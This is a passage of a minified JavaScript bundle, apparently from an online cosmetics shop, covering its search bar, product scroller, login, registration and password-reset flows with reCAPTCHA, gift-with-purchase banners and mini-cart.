.js-gwp-cart-banner"),i.def.$welcomeOverlayElement=e.$parentElement.find(".js-gwp-welcome-overlay")},exists:function(){return 0<i.def.$welcomeBannerElement.length&&!i.def.$welcomeBannerElement.hasClass("hide")},promises:{hideWelcomeMessagePromise:function(){return new r((function(e){i.def.$welcomeBannerElement.css("height",i.def.$welcomeInnerBannerElement.outerHeight()),i.def.$welcomeInnerBannerElement.animate({marginTop:"100%"},1300,(function(){i.def.$welcomeBannerElement.addClass("hide").removeAttr("style"),e()}))}))},fadeOutTextPromise:function(){return new r((function(e){i.def.$welcomeBannerContentElements.animate({opacity:"0"},600,(function(){e()}))}))},fadeInGwpPromise:function(){return new r((function(e){i.def.$approachingDiscountElements.fadeIn(300,(function(){e()}))}))},slideGwpPromise:function(){return new r((function(e){$(".slide-gift").animate({left:0},2e3,(function(){e()}))}))}},animate:function(){i.exists()&&setTimeout((function(){r.all([i.promises.hideWelcomeMessagePromise(),i.promises.fadeOutTextPromise()]).then((function(){return i.promises.fadeInGwpPromise()})).then((function(){i.def.$welcomeOverlayElement.fadeOut(300)})).then((function(){return i.promises.slideGwpPromise()}))}),i.def.delay)}};t.exports=i},{promise:230}],461:[function(e,t,n){var r=e("./modules/util/isMobileOrTabletWidth"),i=e("./modules/helpers/scroll"),a=e("./searchsuggest"),o=$(".js-navigation-row"),s=1023<$(window).width(),l=$(window).width()<1024,c=767<$(window).width()&$(window).width()<1024,u=$(window).width()<768,d=$(".js-header-actions"),p=$(".js-search-input-toggle"),h=$(".js-search-input-field"),f=$(".js-search-quick-links"),A=$(".js-header-logo"),m=$(".js-close-search-bar"),v=$(".js-search-suggestions-container"),g=$(".js-search-overlay"),y=$(".js-search-clear"),b=f.find("a").first(),_=f.find("a").last(),w=$(".js-nav-toggle"),C=$(".js-nav-desktop");function x(){if(C.addClass("fade-nav"),d.addClass("search-expand"),A.addClass("fade-out"),w.addClass("fade-out"),$(".js-nav-toggle").addClass("fade-out"),""!==h.val()){var e=h.val().trim();h.val(e)}m.fadeIn(400,(function(){v.fadeIn(50).addClass("active")})),g.fadeIn(400,(function(){g.on("click",k)})),i.disableScroll(),c&&o.hasClass("active")&&o.addClass("all-visible")}function S(){$(".js-nav-toggle").removeClass("fade-out"),w.removeClass("fade-out"),m.fadeOut(50),v.hide().removeClass("active"),y.hide(),a.clearResults(),h.val(""),g.fadeOut(400,(function(){g.off("click",k),C.removeClass("fade-nav")})),o.length&&(o.hasClass("active")?o.hasClass("active")&&o.removeClass("all-visible"):(i.enableScroll(),d.removeClass("search-expand"),A.removeClass("fade-out")),d.hasClass("search-expand")&&w.focus()),$(".js-navigation-inner").length&&($(".js-navigation-inner").hasClass("active")?$(".js-navigation-inner").hasClass("active")&&($(".js-navigation-inner").removeClass("all-visible"),A.addClass("fade-out"),d.addClass("search-expand"),i.disableScroll(),$(".js-nav-toggle").focus()):(i.enableScroll(),d.removeClass("search-expand"),A.removeClass("fade-out"))),p.show()}function k(){S()}var M={init:function(){p.on("click",(function(e){d.hasClass("search-expand")||(e.preventDefault(),l&&d.addClass("search-expand"),h.focus())})),p.on("blur",(function(){d.hasClass("search-expand")&&(r()||S())})),m.on("click",S),h.on("input",(function(){l&&(""!==$(this).val()?(p.hide(),y.show(),v.hasClass("active")||x()):(p.show(),y.hide()))})),y.on("click",(function(){$(this).hide(),h.val(""),p.show()})),h.on("focus",(function(e){d.hasClass("search-expand")?(o.length&&l&&!o.hasClass("active")&&x(),$(".js-navigation-inner").length&&u&&!$(".js-navigation-inner").hasClass("active")&&x()):l?(e.preventDefault(),$(".js-header-search-wrapper").next().find("> a").focus()):x()})),h.on("keyup",(function(e){13==e.which?""===h.val()&&e.preventDefault():27===e.which&&S()})),m.on("keyup",(function(e){13===e.which&&S()})),_.on("blur",(function(){s&&S()})),h.on("keydown",(function(e){13===e.which&&""===h.val().trim()&&e.preventDefault()})),p.on("click",(function(e){""===h.val().trim()&&e.preventDefault()})),l&&(m.on("keydown",(function(e){9!==e.which||e.shiftKey?9===e.which&&e.shiftKey&&(e.preventDefault(),v.hasClass("active")?$(document).find(".js-search-results-holder a:last-child").focus():_.focus()):(e.preventDefault(),h.focus())})),h.on("keydown",(function(e){if(9!==e.which||e.shiftKey){if(9===e.which&&e.shiftKey)if(e.preventDefault(),v.hasClass("active"))m.focus();else if(!v.hasClass("active")&&$(".js-navigation-inner").hasClass("active")&&u){var t=$(".js-nav-mobile").find(".js-visible");if(t.length){var n=t.find("> .js-mob-scrollable-container > ul > li:last-child");n.hasClass("has-children")?n.find("> .js-mobile-nav-next-lvl").focus():n.find("> a").focus()}else $(".js-nav-mobile").find(".js-nav-mobile-additional").length?$(".js-nav-mobile-additional").find("li:last-child a").focus():$(".js-nav-mobile-main-list").find("> li:last-child > button").focus()}else w.focus()}else e.preventDefault(),""===h.val()?p.focus():y.focus()})),p.on("keydown",(function(e){d.hasClass("search-expand")&&(9!==e.which||e.shiftKey?9===e.which&&e.shiftKey&&(e.preventDefault(),h.focus()):(e.preventDefault(),v.hasClass("active")?b.focus():$(".js-navigation-inner").hasClass("active")?$(".js-nav-toggle").focus():$(".js-navigation-item").first().find("> a").focus()))})),y.on("keydown",(function(e){9===e.which&&e.shiftKey&&(e.preventDefault(),h.focus())})),b.on("keydown",(function(e){9===e.which&&e.shiftKey&&(e.preventDefault(),""===h.val()?p.focus():y.focus())})),_.on("keydown",(function(e){9!==e.which||e.shiftKey||(e.preventDefault(),m.focus())})),$(".js-header-search-wrapper").next().find("> a").on("keydown",(function(e){9===e.which&&e.shiftKey&&(e.preventDefault(),p.focus())}))),a.init()},closeSearchBar:S};t.exports=M},{"./modules/helpers/scroll":493,"./modules/util/isMobileOrTabletWidth":515,"./searchsuggest":610}],462:[function(e,t,n){var r=e("./modules/google").tagManager,i=".js-horizontal-product-scroll",a=".js-scroll-progress",o=[],s=[],l=[],c=0,u={active:!1,rect:"",startX:0,clientX:0,target:""},d=new IntersectionObserver((function(e){var t,n=_createForOfIteratorHelper(e);try{var r=function(){var e=t.value,n=e.boundingClientRect.y,r=parseInt(e.target.dataset.previousY)||0;e.target.classList.toggle("intersecting",e.isIntersecting),e.isIntersecting&&e.target.querySelector(".js-intro").classList.remove("scroll-bg-white"),e.target.querySelectorAll(".scroll-slide-col").forEach((function(t,i){e.isIntersecting&&n<r&&setTimeout((function(){t.style.opacity="1",t.style.transform="translate3d(0, 0, 0)"}),150*i)})),e.target.dataset.previousY=n};for(n.s();!(t=n.n()).done;)r()}catch(e){n.e(e)}finally{n.f()}}),{threshold:[.33,.66]}),p=function(e){o[e.currentTarget.dataset.listIndex].classList.remove("grabbing"),u.target="",u.rect="",u.startX=0,u.clientX=0,u.active=!1},h=function(e){if(u.active){var t=u.startX-(e.clientX-u.rect.x);o[u.target.dataset.listIndex].scrollLeft=t,window.dispatchEvent(new CustomEvent("scroll"))}},f=function(e){var t=o[e.currentTarget.dataset.listIndex];t.classList.add("grabbing"),u.target=e.currentTarget,u.rect=u.target.getBoundingClientRect(),u.startX=t.scrollLeft+e.clientX-u.rect.x,u.clientX=e.clientX,u.active=!0};t.exports={init:function(){0<document.querySelectorAll(i).length&&(document.querySelectorAll(i).forEach((function(e,t){var n=e.querySelector(".js-scroll-slides");n.dataset.listIndex=t,n.querySelectorAll("a, img").forEach((function(e){e.setAttribute("draggable","false")})),n.addEventListener("scroll",(function(e){(function(e){var t=e.currentTarget,n=e.currentTarget.parentNode.querySelector(a),r=100/(t.scrollWidth-t.clientWidth)*t.scrollLeft;n.value=Math.max(2,r)})(e),function(e){var t=$(e.currentTarget.parentNode.querySelector(a)),n=0<t.length&&t.data("analytics");if(n){var i=e.currentTarget,o=100/(i.scrollWidth-i.clientWidth)*i.scrollLeft,l=Math.round(10*o)/10;25<=l&&l<50?c=25:50<=l&&l<75?c=50:75<=l&&l<100?c=75:100==l&&(c=100),0!==c&&-1===s.indexOf(c)&&(s.push(c),r.pushDataLayerEvent(_objectSpread(_objectSpread({},n),{},{scroll_depth:c})))}}(e),function(e){var t=e.currentTarget.parentNode.querySelector(".js-video-slide"),n=t.getBoundingClientRect().x,r=e.currentTarget.parentNode.querySelector(".js-responsive-video-controls"),i=0;n<=window.innerWidth&&(i=1),0!==i&&-1===l.indexOf(i)&&(n<=window.innerWidth&&(t.querySelector("video").play(),r.classList.add("is-playing")),l.push(i))}(e)})),n.addEventListener("mousedown",f),n.addEventListener("mouseup",p),d.observe(e),o.push(n)})),document.addEventListener("mousemove",h))}}},{"./modules/google":474}],463:[function(e,t,n){var r={init:function(){var e=$(".js-load-leatime");e.length&&e.each((function(e,t){var n=$(t),r=n.data("resourceid");r&&$.ajax({type:"GET",url:Urls.leadtimeGetByResourceId,data:{rid:r},success:function(e){e&&n.replaceWith(e)}})}))}};t.exports=r},{}],464:[function(e,t,n){var r=e("./flyout"),i=e("./page"),a=e("./pages/registration"),o=e("./modules/util/getQueryParameter"),s=e("./modules/util/isMobile"),l=e("./modules/util/isMobileOrTabletWidth"),c=e("./validator"),u=e("./modules/ajax"),d=e("./modules/helpers/scroll"),p=e("./modules/helpers/isSmallView"),h=e("./toaster"),f=e("./rituals-form-helper"),A=e("./loseGiftGuestWarning"),m=e("./dialog"),v=e("./modules/google").tagManager,g=e("./recaptchaConfig"),y=e("./dam/dam-helper"),b={init:function(){f.init(),h.init(),$(".oAuthIcon").bind("click",(function(){$("#OAuthProvider").val(this.id)})),$("#dwfrm_login_rememberme").bind("change",(function(){$("#dwfrm_login_rememberme").attr("checked")?$("#rememberme").val("true"):$("#rememberme").val("false")})),x(),C(),S(),function(){var e=$(".js-account-verification");if(e.length)l()?(h.init(),h.def.$toastContent.html(e.html()),h.open({close:function(){$(".js-modal-overlay").hide()}})):m.open({html:e.html(),target:$(".js-bonus-product-dialog-wrapper"),options:{width:600,dialogClass:"gwp-dialog account-verification-popup",open:function(){$(".js-modal-overlay").show(),$(document).on("click touchstart",".js-modal-overlay",(function(){m.close()})),$(document).on("click",".js-gwp-open .js-close-toaster",(function(){m.close()}))},close:function(){m.close(),$(".js-modal-overlay").hide(),$(document).off("click",".js-modal-overlay")}}})}(),0<$(".js-upgrade-form").length&&B(),function(){var e=$("#recaptcha-container-login");e&&!e.hasClass(g.CONSTANTS.HIDE_RECAPTCHA_CLASS)&&I($("#dwfrm_login"),"recaptcha-container-login");var t=$("#recaptcha-container-resetpassword");t&&!t.hasClass(g.CONSTANTS.HIDE_RECAPTCHA_CLASS)&&I($("#PasswordResetForm"),"recaptcha-container-resetpassword")}();var e=$("div.js-guest-button button:first-child");e.on("click",_),e.on("keydown",(function(e){13!==e.keyCode&&32!==e.keyCode||_()})),e.focusout((function(){$('input[id^="dwfrm_login_password"]').removeData("prevent-automatic-validation")}));var t=$(".js-password-reset-link");t.on("click",w),t.mousedown(w),t.on("keydown",(function(e){13!==e.keyCode&&32!==e.keyCode||w()})),t.focusout((function(){$('input[id^="dwfrm_login_password"]').removeData("prevent-automatic-validation")})),$(".js-close-flyout").on("keydown.resetpassword",(function(e){if(9==e.which&&e.shiftKey){if(!r.def.$genericFlyout.find(".js-homepage-link").length)return;e.preventDefault(),r.def.$genericFlyout.find(".js-homepage-link").focus()}})),$(".js-password-reset-dialog").on("click",(function(e){e.preventDefault(),r.load({url:$(e.target).attr("href"),open:function(){c.init()}}),$(this).addClass("js-flyout-opened")})),$(document).on("click",".js-account-back",(function(){window.history.back()})),$(document).on("click",".js-login-back",(function(){window.history.back()})),$(".js-reset-password-confirmation").find(".js-reset-password-close, .js-continue-password-reset").attr("tabindex","-1"),$(document).on("click touchstart",".js-reset-password-close, .js-continue-password-reset, .js-modal-overlay",(function(){$(".js-reset-password-confirmation").removeClass("open"),$(".js-modal-overlay").fadeOut(),$(".js-reset-password-confirmation").find(".js-reset-password-close, .js-continue-password-reset").attr("tabindex","-1"),$(".js-password-reset-button").focus()})),$(".js-new-password-confirmation").find(".js-new-password-close, .js-new-password-reset").attr("tabindex","-1"),$(document).on("click touchstart",".js-new-password-close, .js-new-password-reset, .js-modal-overlay",(function(){$(".js-new-password-confirmation").removeClass("open"),$(".js-modal-overlay").fadeOut(),$(".js-new-password-confirmation").find(".js-new-password-close, .js-new-password-reset").attr("tabindex","-1")})),$("body").on("click",".js-password-reset-link",(function(e){e.preventDefault(),e.stopPropagation();var t,n=$('input[id^="dwfrm_login_username"]');n.length&&(t=n.val().trim()),t||(window.location.href=$(this).attr("href"));var r=$("#dwfrm_requestpassword");r.find("input.js-emailtopass").val(t),r.submit()})),$(".js-password-reset-link").on("keydown",(function(e){13==e.which&&$(this).click()})),$(document).on("click",".js-toggle-password-visibility",(function(e){e.preventDefault();var t=$(this);if(t.toggleClass("visible"),t.hasClass("visible"))return e.preventDefault(),void t.prevAll(".input-text.passwordcheck, .inputfield-text").attr("type","text");t.prevAll(".input-text.passwordcheck, .inputfield-text").attr("type","password")}));var n=o(window.location.href,"welcomeBack");if(n){var i=$(".js-new-password-confirmation span.text-container").text();i=i.replace("{0}",n),$(".js-new-password-confirmation span.text-container").text(i),$(".pt_account_loggedin").length||($(".js-new-password-confirmation").addClass("open"),$(".js-modal-overlay").fadeIn(),$(".js-new-password-confirmation").find(".js-new-password-reset").focus(),$(".js-new-password-confirmation").find(".js-new-password-close, .js-new-password-reset").attr("tabindex","0")),$(".js-new-password-reset").on("keydown",(function(e){9==e.which&&(e.preventDefault(),$(".js-new-password-close").focus())})),$(".js-new-password-close").on("keydown",(function(e){9==e.which&&(e.preventDefault(),$(".js-new-password-reset").focus())})),$(document).on("keydown",(function(e){27==e.which&&$(".js-new-password-confirmation").hasClass("open")&&(e.preventDefault(),$(".js-new-password-confirmation").removeClass("open"),$(".js-modal-overlay").fadeOut(),$(".js-new-password-confirmation").find(".js-new-password-close, .js-new-password-reset").attr("tabindex","-1"),$(".js-skip-to-content").focus())}))}$(document).on("click","#btn-checkout-guest",(function(){v.pushCheckoutEvent("Guest")})),$(document).on("click","#btn-login",(function(){v.pushCheckoutEvent("Login")})),$(document).on("click","#btn-checkout-register",(function(){$(this).addClass("button-loading"),$(this).find(".js-spinner-general").addClass("spinner-visible"),v.pushCheckoutEvent("Register")}))},hideOverlay:z},_=function(){$('input[id^="dwfrm_login_password"]').data("prevent-automatic-validation",!0),$('span[id^="dwfrm_login_password"]').addClass("hide").removeAttr("style"),$('input[id^="dwfrm_login_password"]').removeClass("js-validator-error error")},w=function(){$('input[id^="dwfrm_login_password"]').data("prevent-automatic-validation",!0),$('span[id^="dwfrm_login_password"]').addClass("hide").removeAttr("style"),$('input[id^="dwfrm_login_password"]').removeClass("js-validator-error error")},C=function(){$("body").on("click.resetpassword",'[name$="_requestpassword_send"]',(function(e){var t=$(this),n=t.parents('[name$="_requestpassword"]');if(n.valid()){if(e.preventDefault(),t.addClass("btn--disabled").addClass("button-loading"),t.find(".js-spinner-general").addClass("spinner-visible"),E(n))return e.preventDefault(),!1;var a={form:n,triggeredAction:t.attr("name"),handleCsrfMismatch:function(){i.redirect(Urls.csrffailed)},handleJson:function(e){var r=$("#dwfrm_requestpassword_email");e.showRecaptcha&&(I(n,"recaptcha-container-resetpassword"),$("#recaptcha-container-resetpassword").removeClass(g.CONSTANTS.HIDE_RECAPTCHA_CLASS),t.removeClass("btn--disabled").removeClass("button-loading"),t.find(".js-spinner-general").removeClass("spinner-visible")),e.errorMessage&&(n.validate().showErrors({dwfrm_requestpassword_email:e.errorMessage}),e.showRecaptcha||r.bind("keyup.resetpassword",(function(){$(this).unbind("keyup.resetpassword"),t.removeClass("btn--disabled").removeClass("button-loading"),t.find(".js-spinner-general").removeClass("spinner-visible")}))),r.focus()},callback:function(e){t.removeClass("btn--disabled").removeClass("button-loading"),t.find(".js-spinner-general").removeClass("spinner-visible");var i=$(e);if(!(a=i.find("#PasswordResetForm #dwfrm_requestpassword_email-error")).length||(a.insertBefore($("#dwfrm_requestpassword_email")),0)){var a;$("<div>").append(i).find(".js-display-recaptcha").length&&(I(n,"recaptcha-container-resetpassword"),$("#recaptcha-container-resetpassword").removeClass(g.CONSTANTS.HIDE_RECAPTCHA_CLASS));var o=$(e).filter(".js-reset-password-email").val();window.eventBus.$emit("shouldOpenModal",{paragraphs:[{text:o}],buttons:[{type:"btn btn--secondary",label:window.Resources.CONTINUE,shouldCloseModal:!0}],ctaHolder:{hideOnMobileAndTablet:!0},row:{class:"center-align"},closeElement:{shouldCloseModal:!0},shouldModalCloseOnMobile:!0}),$(".js-reset-password-confirmation").find(".js-continue-password-reset").focus(),$(".js-continue-password-reset").on("keydown",(function(e){9==e.which&&(e.preventDefault(),$(".js-reset-password-close").focus())})),$(".js-reset-password-close").on("keydown",(function(e){9==e.which&&(e.preventDefault(),$(".js-continue-password-reset").focus())})),$(document).on("keydown",(function(e){27==e.which&&$(".js-reset-password-confirmation").hasClass("open")&&(e.preventDefault(),$(".js-reset-password-confirmation").removeClass("open"),$(".js-modal-overlay").fadeOut(),$(".js-reset-password-confirmation").find(".js-reset-password-close, .js-continue-password-reset").attr("tabindex","-1"),$(".js-password-reset-button").focus())})),($(window).width()<768||$(window).innerHeight()>$(window).innerWidth())&&setTimeout((function(){$(".js-reset-password-confirmation").removeClass("open"),$(".js-modal-overlay").fadeOut()}),3e3),r.isOpened()?$(".js-flyout-content").html(e):$(".js-primary-content").html(e);var s=r.def.$genericFlyout.find(".js-homepage-link");s.length&&(s.off("keydown.resetpassword"),s.on("keydown.resetpassword",(function(e){9==e.which&&(e.preventDefault(),r.def.$genericFlyout.find(".js-close-flyout").focus())})))}},handleError:function(){$(".js-flyout-content").html("<h1>"+Resources.SERVER_ERROR+"</h1>")}};u.postForm(a)}}))},x=function(){var e=$(".js-profilecheck");e.length&&e.on("blur",(function(){0<this.value.length&&$.ajax({dataType:"json",url:Urls.checkAccountStatus,data:"login="+this.value}).done((function(e){1===e.result&&r.load({url:Urls.friendlyPasswordReset+"&email="+$(".js-profilecheck").val()})}))}))},S=function(){if(j(),$(document).on("submit.ajaxflow","#dwfrm_login.js-loginajax-form",(function(e){k(this,e)})),"#choose"===window.location.hash){var e=$("#dwfrm_login.js-loginajax-form"),t=$("input[name$=customerEmail]").val();$('input[id^="dwfrm_login_username"]').val(t),k(e,null)}else $(".js-loginwrap").removeClass("hide")},k=function(e,t){var n=$(e);M(t);var r=n.find("button[type=submit]");if(n.valid()){r.addClass("btn--disabled").addClass("button-loading"),r.find(".js-spinner-general").addClass("spinner-visible"),history.replaceState({showElement:".js-loginwrap",removeElement:".js-ajaxflow"},"login-start",window.location.href),history.pushState({formToSubmit:"#dwfrm_login"},null,window.location.href.split("#")[0]+"#");var i={form:n,handleJson:F,handleCsrfMismatch:R,triggeredAction:r.attr("name"),callback:function(e){r.removeClass("btn--disabled").removeClass("button-loading"),r.find(".js-spinner-general").removeClass("spinner-visible"),$("[data-page-name]").remove(),$(".js-loginwrap").hide().after(e),B()}};u.postForm(i)}},M=function(e){null!==e&&"undefined"!==e&&e.preventDefault()};function B(){var e;A.init();var t=$("[data-page-name]");if(0<t.length){t.find("input:not([type=hidden])").first().focus(),c.init(),f.init(),e=t.data("page-name");var n=t.find(".js-account-benefits-image-holder");0<n.length&&y.updateImages(n,!0),setTimeout((function(){var t=e+"--recaptcha-container";I($("#"+t).parents("form"),t)}),1e3)}if("registration"===e)return history.replaceState({showElement:".js-loginwrap",removeElement:".js-ajaxflow"},"login-start",window.location.href),history.pushState({formToSubmit:"#dwfrm_login"},null,window.location.href.split("#")[0]+"#"),P(),void a.init();history.replaceState({showElement:".js-loginwrap",removeElement:'[data-page-name="'+e+'"]'},"login-start",window.location.href),history.pushState({formToSubmit:"#dwfrm_login"},e,window.location.href.split("#")[0]+"#"+e),T(),p()&&$("html, body").scrollTop(0)}function E(e){var t=e.data(g.CONSTANTS.RECAPTCHA_CONTAINER_ID_ATTR);if(!e.hasClass(g.CONSTANTS.FORM_EXECUTE_RECAPTCHA_CLASS)||e.hasClass(g.CONSTANTS.CHALLENGE_DONE_CLASS))return g.removeChallengeDoneClass(t),!1;var n=e.find("#"+t);return!(!n.length||n.hasClass(g.CONSTANTS.HIDE_RECAPTCHA_CLASS)||(g.executeForContainer(t),0))}var T=function(){$("body").off("submit","#dwfrm_completeaccount.js-loginajax-form").on("submit","#dwfrm_completeaccount.js-loginajax-form",(function(e){var t=$(this);if(e.preventDefault(),t.valid()){var n=$(this).find("button[type=submit]");if(n.addClass("btn--disabled").addClass("button-loading"),n.find(".js-spinner-general").addClass("spinner-visible"),E(t))return e.preventDefault(),!1;var r={form:t,handleJson:L,handleCsrfMismatch:R,triggeredAction:n.attr("name")};u.postForm(r)}}))},P=function(){$("body").on("submit","#RegistrationForm.js-loginajax-form",(function(e){var t=$(this);e.preventDefault();var n=$(this).find("button[type=submit]");if(t.valid()){if(n.addClass("btn--disabled").addClass("button-loading"),n.find(".js-spinner-general").addClass("spinner-visible"),E(t))return e.preventDefault(),!1;var r={form:t,handleJson:O,handleCsrfMismatch:b.handleLoginCsrfMismatch,triggeredAction:n.attr("name")};u.postForm(r)}}))};function I(e,t){var n=[g.buildContainerDefinition(e,t,g.defaultVerifyHandler)];g.init(n),e.addClass(g.CONSTANTS.FORM_EXECUTE_RECAPTCHA_CLASS),e.data(g.CONSTANTS.RECAPTCHA_CONTAINER_ID_ATTR,t)}var F=function(e){$("[data-page-name]").remove();var t=$("#dwfrm_login"),n=t.find("button[type=submit]");if(0<$(".js-onboarding-view").length&&D(),e.redirectTo)window.location.replace(e.redirectTo);else if(e.showPasswordField){t.attr("action",e.continueURL),e.ajaxFlow||t.addClass("js-postback");var r=$(".js-spinner-general",n);n.attr("value",e.buttonLabel),n.attr("name",e.buttonHtmlName),n.text(e.buttonLabel),n.append(r),$(".hide.js-guest-button").removeClass("hide");var i=e.showRecaptcha?t.find(".hide"):t.find(".js-slidedown.hide");if(A.init(),i.slideDown((function(){var r=t.find("input[type=password]");r.removeAttr("disabled"),i.removeClass("hide"),i.find("label, .js-toggle-password-visibility").removeClass("label-disabled"),e.showRecaptcha&&I(t,"recaptcha-container-login"),n.removeClass("btn--disabled").removeClass("button-loading"),n.find(".js-spinner-general").removeClass("spinner-visible"),r.focus()})),e.ajaxFlow)return;$("#dwfrm_login.js-loginajax-form").removeClass("js-loginajax-form")}else{if(e.errorHtml){var a=t.find(".error-form");a.length||t.prepend(e.errorHtml),a.hide().slideDown()}if(e.showRecaptcha)return I(t,"recaptcha-container-login"),void n.removeClass("btn--disabled");e.validCredentials&&U(e.showGwpWelcomeMessage),n.removeClass("btn--disabled").removeClass("button-loading"),n.find(".js-spinner-general").removeClass("spinner-visible")}},L=function(e){return N(e,"#dwfrm_completeaccount")},O=function(e){return N(e,"#RegistrationForm")},N=function(e,t){if(e.valid)return e.redirectTo?void window.location.replace(e.redirectTo):void U();var n=$(t);if(e.showLogin?(n=$("#dwfrm_login"),$("[data-page-name]").remove(),$(".js-loginwrap").show()):I(n,n.find(".recaptcha-container").attr("id")),e.errorHtml){var r=n.find(".error-form");r.length||n.prepend(e.errorHtml),r.hide().slideDown()}var i=n.find("button[type=submit]");i.removeClass("btn--disabled").removeClass("button-loading"),i.find(".js-spinner-general").removeClass("spinner-visible")},D=function(){$(".js-onboarding-hide").each((function(){$(this).addClass("hide")})),$(".js-onboarding-show").each((function(){$(this).removeClass("hide")}))},R=function(){var e={url:Urls.getLoginPage,target:$(".js-loginwrap"),replaceTarget:!0};u.load(e)},j=function(){window.onpopstate=function(e){return!e.state||(e.state.showElement&&$(e.state.showElement).show(),e.state.removeElement&&$(e.state.removeElement).remove(),e.state.hideElement&&$(e.state.hideElement).hide(),e.state.formToSubmit?($(e.state.formToSubmit).submit(),e.preventDefault(),e.stopPropagation(),!1):void 0)}},U=function(t){z(),t&&s()&&(e("./bonus-products-view").getGWPBanner(),h.load({url:Urls.getGwpWelcomeToastMessage+"?currentPipeline="+Urls.currentPipeline,close:function(){0<$(".pt_cart").length&&location.reload()}}))};function z(){$(".js-login-overlay").animate({bottom:"-100%"},800,(function(){$(this).removeClass("overlay-visible").empty()})),d.enableScroll()}t.exports=b},{"./bonus-products-view":293,"./dam/dam-helper":430,"./dialog":433,"./flyout":447,"./loseGiftGuestWarning":466,"./modules/ajax":470,"./modules/google":474,"./modules/helpers/isSmallView":487,"./modules/helpers/scroll":493,"./modules/util/getQueryParameter":507,"./modules/util/isMobile":514,"./modules/util/isMobileOrTabletWidth":515,"./page":534,"./pages/registration":579,"./recaptchaConfig":603,"./rituals-form-helper":606,"./toaster":622,"./validator":624}],465:[function(e,t,n){var r=e("./modules/ajax"),i=e("./login"),a=e("./modules/helpers/scroll"),o=e("./modules/util/isMobile"),s=e("./toaster"),l={init:function(){o()&&($(document).on("click",".js-trigger-overlay-login",(function(e){e.preventDefault(),e.stopPropagation(),c(!1)})),$(document).on("click",".js-trigger-overlay-gwp-login",(function(e){e.preventDefault(),e.stopPropagation(),c(!0,$(this).data("gwpsource"))})),$(document).on("click",".js-hide-overlay",(function(e){e.preventDefault(),e.stopPropagation(),i.hideOverlay()})))}},c=function(e,t){s.closeToasters();var n=$(".js-login-overlay");r.load({skipDataType:!0,data:{showGwpWelcomeMessage:e,gwpsource:t},url:Urls.getLoginPage,target:n,handleJson:function(e){e.alreadyLoggedIn},callback:function(e){n.addClass("overlay-visible").animate({bottom:0},800,(function(){i.init(),a.disableScroll(),n.find(".js-loginwrap .inputfield-text").first().focus()}))}})};t.exports=l},{"./login":464,"./modules/ajax":470,"./modules/helpers/scroll":493,"./modules/util/isMobile":514,"./toaster":622}],466:[function(e,t,n){var r=e("./dam/dam-helper"),i={def:{guestCheckoutForm:".js-guest-checkout-form"},createBonusWarningDialog:function(e,t){window.eventBus.$emit("shouldOpenModal",{paragraphs:[{text:window.Resources.REMOVE_GIFT_EXPLANATION,textLarge:!0},{text:window.Resources.REMOVE_GIFT_QUESTION,textLarge:!0}],productImage:{src:t.src,alt:e,class:t.class,placeholder:t.placeholder},buttons:[{type:"btn btn--secondary",label:window.Resources.MODAL_NO,eventName:"onCancelLoseGiftButtonClick",shouldCloseModal:!0},{type:"btn",label:window.Resources.MODAL_YES,eventName:"onConfirmLoseGiftButtonClick",shouldCloseModal:!0}],row:{class:"center-align"},closeElement:{shouldCloseModal:!0},ctaHolder:{},modalLarge:!0,ctaHolderRow:!0}),window.eventBus.$on("onConfirmLoseGiftButtonClick",(function(){$(document).off("submit.popup",".js-guest-checkout-form"),$(".js-guest-checkout-form").find("button").click()})),window.eventBus.$on("onCancelLoseGiftButtonClick",(function(){var e=$("#btn-checkout-guest");e.removeClass("button-loading"),$(".js-spinner-general",e).removeClass("spinner-visible")})),window.eventBus.$off("modalOpen").$on("modalOpen",(function(){r.updateImages($("#modal"))}))},events:function(){$(document).off("submit.popup",i.def.guestCheckoutForm).on("submit.popup",i.def.guestCheckoutForm,(function(e){var t=$("button[type=submit]",this);t.addClass("button-loading"),$(".js-spinner-general",t).addClass("spinner-visible");var n=$("#js-gwp-for-guest-product-name").val(),r=$("#js-gwp-for-guest-product-image");if(!r.length)return!0;var a=JSON.parse(r.val());e.preventDefault(),i.createBonusWarningDialog(n,a)}))},init:function(){i.events()}};t.exports=i},{"./dam/dam-helper":430}],467:[function(e,t,n){var r=e("./header-menu"),i=e("./flyout"),a=e("./modules/helpers/isDesktopOrTabletLandscapeView"),o=e("./loginOverlay"),s=e("./modules/util/isMobile"),l=e("./gwp-welcome-message"),c=e("./pages/personalisedgifting/pgminicart"),u=e("./dam/dam-helper"),d=e("./modules/util/ajaxUrl"),p={id:null,clear:function(){this.id&&(window.clearTimeout(this.id),delete this.id)},start:function(e,t){this.id=setTimeout(t,e)}},h={isInitialized:!1,init:function(){if(!this.isInitialized){c.init(this),o.init();var t=this;this.$el=$(".js-minicart-flyout");var n=function(){t.show(),p.clear(),$(".js-open-minicart").addClass("js-flyout-opened"),u.updateImages($(".js-minicart-flyout")),$(".js-gwp-welcome-banner").length&&$(".js-gwp-welcome-banner").addClass("visible")};$(document).off("click",".js-open-minicart"),$(document).on("click",".js-open-minicart",(function(e){a()&&(e.preventDefault(),n())})),this.isInitialized=!0;var r,i,l,h,f,A,m,v=$(".js-gwp-shoppingcart-wrapper"),g=$(".js-gwp-minicart-wrapper");if(g.length&&g.first().hasClass("js-just-logged-in")||v.length&&v.first().hasClass("js-is-incremented")){var y=g.hasClass("js-has-promotions"),b=!!$(".js-cart-page-wrapper").length,_=!!$(".js-go-to-overview").length;if(y&&!_||b){var w=$(".js-incremented-product-data");$(".js-minicart-discount-data").length&&(w=$(".js-minicart-discount-data").first()),w.length?(r=w,i=t,l=n,h=!!$(".js-cart-page-wrapper").length,f=e("./bonus-products-view"),A=r.data("choice-discount-url"),m=r.data("choice-selected-product").toString(),f.show({url:A,giftChange:!0,response:!0,selectedID:m,onClose:function(){s()?$.ajax({type:"GET",url:d(Urls.showPromotionsPopup),success:function(e){e&&i.showMobileCrmToast(e)}}):h||l()}})):s()?$.ajax({type:"GET",url:d(Urls.showPromotionsPopup),success:function(e){e&&t.showMobileCrmToast(e)}}):n()}}if(!s()){var C=$(".js-minicart-flyout-inner-content .js-gwp-welcome-banner");0<C.length&&!C.hasClass("hide")&&(n(),t.scrollToGwp(),t.animateGwpWelcomeMessage())}0<$(".js-cart-merged").length&&n()}},scrollToGwp:function(){var e=$(".gwp-minicart-wrapper");if(0!==e.length){var 